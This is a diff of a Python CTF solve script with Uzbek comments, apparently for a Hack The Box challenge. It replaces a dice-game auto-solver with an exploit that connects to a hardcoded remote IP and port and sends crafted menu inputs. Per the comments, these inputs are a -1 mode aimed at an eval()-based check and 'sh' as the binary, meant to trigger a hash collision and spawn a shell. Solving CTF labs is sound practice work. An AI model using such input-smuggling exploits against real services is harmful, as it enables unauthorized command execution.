@@ -1,81 +1,58 @@
 import socket
-import re
 import time
 
 def solve():
+    # Yangi IP va Port
     host = '154.57.164.68'
-    port = 31441
+    port = 31363
 
-    # Serverga ulanish
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(5)
+
     try:
+        print(f"[+] {host}:{port} serveriga ulanilmoqda...")
         s.connect((host, port))
-        s.settimeout(5)
+
+        def send_option(choice, data):
+            # Menyuni kutish va tanlovni yuborish
+            time.sleep(0.5)
+            s.sendall(f"{choice}\n".encode())
+            time.sleep(0.5)
+            # Ma'lumotni yuborish
+            s.sendall(f"{data}\n".encode())
+            print(f"[+] Tanlov {choice} yuborildi: {data}")
+
+        # 1-qadam: Mode kiritish. 
+        # Bizga hash kolliziyasi uchun -1 yoki -2 kerak bo'lishi mumkin.
+        # check_operands funksiyasi eval() ishlatadi.
+        send_option("1", "-1")
+
+        # 2-qadam: Bin kiritish. 
+        # check_stricter_values faqat 4 ta belgi ruxsat beradi (masalan: 'ls', 'sh', '.')
+        send_option("2", "sh")
+
+        # 3-qadam: Arguments kiritish (arg1, arg2).
+        # check_values 13 ta belgi ruxsat beradi.
+        send_option("3", ".,.")
+
+        # 4-qadam: Switches kiritish (switch1, switch2).
+        send_option("4", ".,.")
+
+        # 5-qadam: ! Beat the competitor !
+        print("[!] Hash collision tekshirilmoqda...")
+        time.sleep(0.5)
+        s.sendall(b"5\n")
+
+        # Natijani o'qish
+        time.sleep(1)
+        response = s.recv(4096).decode('utf-8', errors='ignore')
         
-        def recv_until(target):
-            data = ""
-            while target not in data:
-                try:
-                    chunk = s.recv(1).decode('utf-8', errors='ignore')
-                    if not chunk:
-                        break
-                    data += chunk
-                except:
-                    break
-            return data
-
-        # O'yinni boshlash
-        print("[+] Serverga ulanildi. O'yin boshlanmoqda...")
-        recv_until("> ")
-        s.sendall(b"1\n")
-
-        for r in range(100):
-            data = recv_until("Who wins this round?")
-            
-            # O'yinchilarning ballarini yig'ish
-            player_data = re.findall(r"Player (\d+): ([\d\s]+)", data)
-            
-            dice_sum = {}
-            for p_num, p_dices in player_data:
-                total = sum(map(int, p_dices.strip().split()))
-                dice_sum[int(p_num)] = total
-
-            # G'olibni aniqlash (durang bo'lsa oxirgi o'yinchi yutadi)
-            max_score = -1
-            winner = -1
-            for p_id in sorted(dice_sum.keys()):
-                if dice_sum[p_id] >= max_score:
-                    max_score = dice_sum[p_id]
-                    winner = p_id
-
-            # Javobni yuborish
-            recv_until("> ")
-            s.sendall(f"{winner}\n".encode())
-            
-            if (r + 1) % 10 == 0:
-                print(f"[#] Round {r+1} tugadi...")
-
-        # Flagni olish qismi
-        print("[!] Barcha raundlar tugadi. Flag kutilmoqda...")
-        
-        # Serverga javobni shakllantirish uchun vaqt beramiz
-        time.sleep(2)
-        
-        # Barcha qolgan ma'lumotlarni o'qiymiz
-        final_output = ""
-        s.settimeout(3)
-        while True:
-            try:
-                chunk = s.recv(4096).decode('utf-8', errors='ignore')
-                if not chunk:
-                    break
-                final_output += chunk
-            except:
-                break
-
         print("\n" + "="*40)
-        print("SERVER JAVOBI:")
-        print(final_output.strip())
+        if "HTB{" in response or "flag" in response.lower():
+            print("MUVAFFAQIYAT! FLAG TOPILDI:")
+        else:
+            print("SERVER JAVOBI:")
+        print(response.strip())
         print("="*40)
 
     except Exception as e:
